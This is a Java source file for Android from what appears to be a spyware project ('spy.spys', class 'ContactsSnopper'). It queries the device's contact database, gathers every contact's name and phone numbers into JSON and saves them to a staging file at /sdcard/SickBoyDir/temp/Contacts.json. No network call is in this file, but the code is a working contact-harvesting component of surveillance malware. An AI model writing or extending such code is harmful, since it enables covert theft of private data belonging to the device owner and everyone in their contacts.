package com.gameofcoding.spy.spys;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsSnopper extends Spy {
    private Context mContext;
    private final JSONArray contacts = new JSONArray();

    public ContactsSnopper(Context context) {
	mContext = context;
    }
    
    @Override
    public boolean hasPermissions() {
	// TODO: Check contacts permission
	return false;
    }

    public ContactsSnopper loadContacts() {
	ContentResolver contentResolver = mContext.getContentResolver();
	Cursor contCursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
						  null, null, null, null);
	if ((contCursor != null ? contCursor.getCount() : 0) > 0) {
	    while (contCursor != null && contCursor.moveToNext()) {
		// Load Contact
		String contactID = contCursor
		    .getString(contCursor.getColumnIndex(ContactsContract.Contacts._ID));
		String contactName = contCursor
		    .getString(contCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

		if (contCursor.getInt(contCursor.getColumnIndex(ContactsContract
								.Contacts.HAS_PHONE_NUMBER)) > 0) {
		    // Load Contact Phone Numbers
		    Cursor pNumsCursor = contentResolver
			.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
			       ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
			       new String[]{contactID}, null);
		    try {
			JSONArray pNumbers = new JSONArray();
			while (pNumsCursor.moveToNext()) {
			    String strPNumber = pNumsCursor
				.getString(pNumsCursor.getColumnIndex(ContactsContract
								      .CommonDataKinds.Phone.NUMBER));
			    pNumbers.put(strPNumber);
			}
			pNumsCursor.close();

			// Add loaded contact to JSON objects
			JSONObject contact = new JSONObject();
			contact.put("Name", contactName);
			contact.put("Phone Numbers", pNumbers);
			contacts.put(contact);
		    } catch(JSONException e) {
			throw new RuntimeException(e);
		    }
		}
	    }
	}
	if(contCursor != null)
	    contCursor.close();
	return this;
    }

    public void saveContacts() {
	try {
	    File contactsFile = new File("/sdcard/SickBoyDir/temp/Contacts.json");
	    FileWriter fw = new FileWriter(contactsFile);
	    BufferedWriter bw = new BufferedWriter(fw);
	    bw.write(contacts.toString());
	    bw.close();
	    fw.close();
	} catch(Exception e) {
	    throw new RuntimeException(e);
	}
    }
}
